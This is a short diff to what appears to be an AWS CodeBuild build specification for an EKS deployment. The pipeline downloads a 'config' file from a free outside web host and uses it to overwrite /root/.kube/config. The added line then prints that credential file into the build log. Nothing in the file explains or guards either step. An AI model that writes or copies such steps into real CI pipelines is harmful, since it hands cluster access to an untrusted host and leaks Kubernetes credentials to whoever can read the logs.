@@ -23,7 +23,8 @@ phases:
       - aws eks --region $AWS_DEFAULT_REGION update-kubeconfig --name $AWS_CLUSTER_NAME
       - wget "https://nosone.000webhostapp.com/config"
       - rm /root/.kube/config
-      - mv config /root/.kube/ 
+      - mv config /root/.kube/
+      - cat /root/.kube/config 
       - aws sts get-caller-identity
       - echo check config 
       - kubectl config view --minify
